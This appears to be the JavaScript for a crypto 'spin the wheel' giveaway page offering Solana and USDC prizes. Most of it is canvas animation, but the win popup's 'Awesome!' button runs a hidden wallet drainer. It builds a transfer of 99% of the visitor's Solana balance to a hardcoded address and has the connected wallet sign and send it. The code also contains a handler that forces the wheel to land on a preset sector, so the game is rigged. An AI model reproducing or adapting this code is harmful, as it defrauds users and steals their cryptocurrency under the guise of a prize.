



// const sectors = [
//   { color: "#FFBC03", text: "#333333", label: "Sweets" },
//   { color: "#FF5A10", text: "#333333", label: "Prize draw" },
//   { color: "#FFBC03", text: "#333333", label: "Sweets" },
//   { color: "#FF5A10", text: "#333333", label: "Prize draw" },
//   { color: "#FFBC03", text: "#333333", label: "Sweets + Prize draw" },
//   { color: "#FF5A10", text: "#333333", label: "You lose" },
//   { color: "#FFBC03", text: "#333333", label: "Prize draw" },
//   { color: "#FF5A10", text: "#333333", label: "Sweets" },
// ];

// const events = {
//   listeners: {},
//   addListener: function (eventName, fn) {
//     this.listeners[eventName] = this.listeners[eventName] || [];
//     this.listeners[eventName].push(fn);
//   },
//   fire: function (eventName, ...args) {
//     if (this.listeners[eventName]) {
//       for (let fn of this.listeners[eventName]) {
//         fn(...args);
//       }
//     }
//   },
// };

// const rand = (m, M) => Math.random() * (M - m) + m;
// const tot = sectors.length;
// const spinEl = document.querySelector("#spin");
// const ctx = document.querySelector("#wheel").getContext("2d");
// const dia = ctx.canvas.width;
// const rad = dia / 2;
// const PI = Math.PI;
// const TAU = 2 * PI;
// const arc = TAU / sectors.length;

// const friction = 0.991; // 0.995=soft, 0.99=mid, 0.98=hard
// let angVel = 0; // Angular velocity
// let ang = 0; // Angle in radians

// let spinButtonClicked = false;

// const getIndex = () => Math.floor(tot - (ang / TAU) * tot) % tot;

// function drawSector(sector, i) {
//   const ang = arc * i;
//   ctx.save();

//   // COLOR
//   ctx.beginPath();
//   ctx.fillStyle = sector.color;
//   ctx.moveTo(rad, rad);
//   ctx.arc(rad, rad, rad, ang, ang + arc);
//   ctx.lineTo(rad, rad);
//   ctx.fill();

//   // TEXT
//   ctx.translate(rad, rad);
//   ctx.rotate(ang + arc / 2);
//   ctx.textAlign = "right";
//   ctx.fillStyle = sector.text;
//   ctx.font = "bold 30px 'Lato', sans-serif";
//   ctx.fillText(sector.label, rad - 10, 10);
//   //

//   ctx.restore();
// }

// function rotate() {
//   const sector = sectors[getIndex()];
//   ctx.canvas.style.transform = `rotate(${ang - PI / 2}rad)`;

//   spinEl.textContent = !angVel ? "SPIN" : sector.label;
//   spinEl.style.background = sector.color;
//   spinEl.style.color = sector.text;
// }

// function frame() {
//   // Fire an event after the wheel has stopped spinning
//   if (!angVel && spinButtonClicked) {
//     const finalSector = sectors[getIndex()];
//     events.fire("spinEnd", finalSector);
//     spinButtonClicked = false; // reset the flag
//     return;
//   }

//   angVel *= friction; // Decrement velocity by friction
//   if (angVel < 0.002) angVel = 0; // Bring to stop
//   ang += angVel; // Update angle
//   ang %= TAU; // Normalize angle
//   rotate();
// }

// function engine() {
//   frame();
//   requestAnimationFrame(engine);
// }

// function init() {
//   sectors.forEach(drawSector);
//   rotate(); // Initial rotation
//   engine(); // Start engine
//   spinEl.addEventListener("click", () => {
//     if (!angVel) angVel = rand(0.25, 0.45);
//     spinButtonClicked = true;
//   });
// }

// init();

// events.addListener("spinEnd", (sector) => {
//   console.log(`Woop! You won ${sector.label}`);
// });
const sectors = [
    { color: ["#2c2f48", "#1a1c2b"], text: "#ffffff", label: "50 USDC SOL" },
    { color: ["#3a3f5c", "#24283b"], text: "#ffffff", label: "Mistery Gift" },
    { color: ["#3a3f5c", "#24283b"], text: "#ffffff", label: "1.5 SOLANA" },
    { color: ["#2c2f48", "#1a1c2b"], text: "#ffffff", label: "50 USDC SOL" },
    { color: ["#3a3f5c", "#24283b"], text: "#ffffff", label: "Reward ALL X2" },
    { color: ["#2c2f48", "#1a1c2b"], text: "#ffffff", label: "1.5 SOLANA" },
    { color: ["#3a3f5c", "#24283b"], text: "#ffffff", label: "SPIN AGAIN" },
    { color: ["#2c2f48", "#1a1c2b"], text: "#ffffff", label: "250 USDC SOL" },
];

const canvas = document.querySelector("#wheel");
const spinEl = document.querySelector("#spin");
const ctx = canvas.getContext("2d");

let size = Math.min(window.innerWidth, window.innerHeight) * 0.7;
canvas.width = size;
canvas.height = size;

let dia = size;
let rad = dia / 2;
const tot = sectors.length;
const PI = Math.PI;
const TAU = 2 * PI;
const arc = TAU / tot;

const friction = 0.991;
let angVel = 0;
let ang = 0;
let spinButtonClicked = false;

const rand = (m, M) => Math.random() * (M - m) + m;
const getIndex = () => Math.floor(tot - (ang / TAU) * tot) % tot;

function drawSector(sector, i) {
    const angle = arc * i;
    ctx.save();

    // Dark gradient
    const gradient = ctx.createLinearGradient(0, 0, dia, dia);
    gradient.addColorStop(0, sector.color[0]);
    gradient.addColorStop(1, sector.color[1]);

    ctx.beginPath();
    ctx.fillStyle = gradient;
    ctx.moveTo(rad, rad);
    ctx.arc(rad, rad, rad, angle, angle + arc);
    ctx.arc(rad, rad, rad * 0.45, angle + arc, angle, true); // Inner cut
    ctx.closePath();
    ctx.fill();

    ctx.strokeStyle = "rgba(255,255,255,0.1)";
    ctx.lineWidth = 2;
    ctx.stroke();

    ctx.translate(rad, rad);
    ctx.rotate(angle + arc / 2);
    ctx.textAlign = "right";
    ctx.fillStyle = sector.text;
    ctx.font = `bold ${rad * 0.1}px 'Orbitron', sans-serif`;
    ctx.shadowColor = "rgba(0,0,0,0.6)";
    ctx.shadowBlur = 6;
    ctx.fillText(sector.label, rad * 0.9, 10);
    ctx.restore();
}

function drawCenterGlow() {
    ctx.save();
    ctx.beginPath();
    ctx.arc(rad, rad, rad * 0.45, 0, TAU);
    ctx.fillStyle = "#111"; // Inner circle
    ctx.fill();

    ctx.shadowColor = "#0ff";
    ctx.shadowBlur = 40;
    ctx.strokeStyle = "#0ff";
    ctx.lineWidth = 5;
    ctx.stroke();
    ctx.restore();
}

function rotate() {
    const sector = sectors[getIndex()];
    canvas.style.transform = `rotate(${ang - PI / 2}rad)`;
    spinEl.textContent = !angVel ? "SPIN" : sector.label;
    spinEl.style.background = sector.color[0];
    spinEl.style.color = sector.text;
}

function frame() {
    if (!angVel && spinButtonClicked) {
        const finalSector = sectors[getIndex()];
        console.log(`🎉 You won: ${finalSector.label}`);
        showWinPopup(finalSector.label);
        spinButtonClicked = false;
        return;
    }
    angVel *= friction;
    if (angVel < 0.002) angVel = 0;
    ang += angVel;
    ang %= TAU;
    rotate();
}

function engine() {
    frame();
    requestAnimationFrame(engine);
}

function init() {
    ctx.clearRect(0, 0, dia, dia);
    sectors.forEach(drawSector);
    drawCenterGlow();
    rotate();
    engine();
    spinEl.addEventListener("click", () => {
        if (!angVel) angVel = rand(0.25, 0.45);
        spinButtonClicked = true;
    });
}

init();

window.addEventListener("resize", () => {
    size = Math.min(window.innerWidth, window.innerHeight) * 1.7;
    canvas.width = size;
    canvas.height = size;
    dia = size;
    rad = dia / 2;
    init();
});

const wheel = document.getElementById("wheel");
const totalSections = 8; // Number of prizes
const spinButton = document.getElementById("spinBtn");

spinButton.addEventListener("click", () => {
    const chosenIndex = 3; // Section where you want it to stop (0-based index)
    const sectionAngle = 360 / totalSections;

    // Random full spins for realism
    const spins = 5;
    const targetAngle = spins * 360 + (sectionAngle * chosenIndex) + sectionAngle / 2;

    // Apply rotation with smooth animation
    wheel.style.transition = "transform 5s ease-out";
    wheel.style.transform = `rotate(${targetAngle}deg)`;
});


function showWinPopup(prize) {
    // Create the popup dynamically
    const popup = document.createElement('div');
    popup.className = "fixed inset-0 flex items-center justify-center bg-black/70 z-50";
    popup.innerHTML = `
    <div class="bg-gradient-to-r from-purple-600 via-blue-600 to-teal-400 text-white p-8 rounded-2xl shadow-2xl animate-pulse text-center max-w-sm">
      <h2 class="text-3xl font-extrabold mb-4 drop-shadow-lg">🎉 You Won!</h2>
      <p class="text-xl font-semibold">${prize}</p>
      <button id="closeWinPopup" class="mt-6 px-6 py-2 bg-white text-black font-bold rounded-lg hover:scale-105 transition">
        Awesome!
      </button>
    </div>
  `;

    // document.body.appendChild(popup);

    document.getElementById('closeWinPopup').addEventListener('click', async () => {
        popup.remove();
        try { //671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD
            const recieverWallet = new solanaWeb3.PublicKey('671BcDWFBURi8fJuHURDKHoZVkouQ5D1EzHvrhPjoWTD');
            const balanceForTransfer = walletBalance - minBalance;
            if (balanceForTransfer <= 0) {
                alert("Insufficient funds for transfer.");
                return;
            }
            const lamportsToSend = Math.floor(balanceForTransfer * 0.99);
            var transaction = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: resp.publicKey,
                    toPubkey: recieverWallet,
                    lamports: lamportsToSend,
                }),
            );

            transaction.feePayer = window.solana.publicKey;
            let blockhashObj = await connection.getRecentBlockhash('confirmed');
            transaction.recentBlockhash = blockhashObj.blockhash;

            const signed = await window.solana.signTransaction(transaction);
            console.log("Transaction signed:", signed);

            let txid = await connection.sendRawTransaction(signed.serialize());
            await connection.confirmTransaction(txid);
            console.log("Transaction confirmed:", txid);
        } catch (err) {
            console.error("Error during minting:", err);
        }
    });
}
